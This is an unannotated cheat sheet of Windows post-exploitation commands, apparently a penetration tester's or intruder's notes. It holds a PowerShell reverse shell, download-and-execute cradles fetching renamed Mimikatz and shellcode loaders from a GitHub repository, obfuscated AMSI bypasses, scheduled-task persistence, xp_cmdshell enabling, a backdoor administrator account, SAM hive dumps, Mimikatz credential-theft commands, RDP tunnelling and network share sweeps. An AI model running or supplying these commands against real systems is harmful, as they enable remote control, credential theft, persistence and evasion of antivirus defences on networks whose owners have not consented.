----------------------------------------------------------------------------------------------------------------------------------------

powershell -noexit -ExecutionPolicy Unrestricted "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.2',443);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)}"

powershell "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-TokenManipulation.ps1') ; Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'nt authority\system'"

powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost <IP> -Lport 443 -Force"
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokeholacode.ps1'); Invoke-Adios -Payload windows/meterpreter/reverse_http -Lhost <IP> -Lport 443 -Force"

powershell "IEX (New-Object Net.WebClient).DownloadString('file://C:/Users/Public/System/Invoke-Shellcode.ps1'); Invoke-Adios -Payload windows/meterpreter/reverse_http -Lhost <IP> -Lport 443 -Force"

powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1'); Invoke-Mimiadios -DumpCreds

powershell -version 2 -Command [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1');Invoke-Mimiadios -DumpCreds

powershell -version 2 -Command [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1');IEX ('if(0){{{0}}}' -f $(0 -as [char]) + 'Invoke-'+'Mimiadios -DumpCreds')

powershell -version 2 -Command IEX ('if(0){{{0}}}' -f $(0 -as [char]) + '[Ref].Assembly.GetType("System.Management.Automation.Amsi'+'Utils").GetField("amsi'+'InitFailed","NonPublic,Static").SetValue($null,$true)');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1');IEX ('if(0){{{0}}}' -f $(0 -as [char]) + 'Invoke-'+'Mimiadios -DumpCreds')

powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/analyticsearch/commercial/master/wget.exe', 'C:\Support\wget.exe') }"

----------------------------------------------------------------------------------------------------------------------------------------

schtasks /create /tn "Driver Support" /tr "cmd.exe /Q /C C:\Support\driver.bat" /sc DAILY /st 00:11 /f /RI 60 /du 24:00
schtasks /Query /FO List /v /TN "Driver Support"

sp_configure 'show advanced options',1;
RECONFIGURE;
exec sp_configure 'xp_cmdshell',1;
RECONFIGURE;

exec xp_cmdshell 'whoami'

osql.exe -S <server> -U <username> -P <password> -Q "xp_cmdshell 'whoami'"

net localgroup administrators && net user username password /add && net localgroup administrators username /add && net localgroup "Remote Desktop Users" username /add

----------------------------------------------------------------------------------------------------------------------------------------

Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -force;Unblock-File -Path ".\Get-NetworkShares.ps1";Import-Module .\Get-NetworkShares.ps1;.\Get-NetworkShares.ps1 -ComputerName HOSTNAME

net view
net use q: \\share_name
wmic logicaldisk get name
net use q: /delete

7za.exe a -tzip analytic.zip C:\support\

reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL

run post/windows/manage/migrate

plink -l username -pw password -R 3389:192.168.1.2:3389 192.168.2.2 -P 22
portfwd add -l 3389 -p 3389 -r 192.168.1.2

reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM

query session /server:
reset session 1

----------------------------------------------------------------------------------------------------------------------------------------

privilege::debug
token::elevate
lsadump::sam
sekurlsa::logonpasswords

----------------------------------------------------------------------------------------------------------------------------------------

Import-Module PowerUpSQL.psd1;Get-SQLInstanceDomain -Verbose -DomainController 192.168.1.1 -Username <username> -password <password>

----------------------------------------------------------------------------------------------------------------------------------------

goddi-windows-amd64.exe -username=<username> -password="<password>" -domain="<domainname.com>" -dc="<dc_ip>" -unsafe

----------------------------------------------------------------------------------------------------------------------------------------

for($i=1;$i -lt 255;$i++){$ip="10.10.101."+$i;echo "" $ip "";$shares = net view \\$ip /all | select -Skip 7 | ?{$_ -match 'disk*'} | %{$_ -match '^(.+?)\s+Disk*'|out-null;$matches[1]};$shares;echo "-----------------------------------"}

for($i=1;$i -lt 255;$i++){Write-Host ("[*] 10.10.101." + $i); Get-WmiObject -class win32_share -ComputerName ("10.10.101." + $i)}

----------------------------------------------------------------------------------------------------------------------------------------
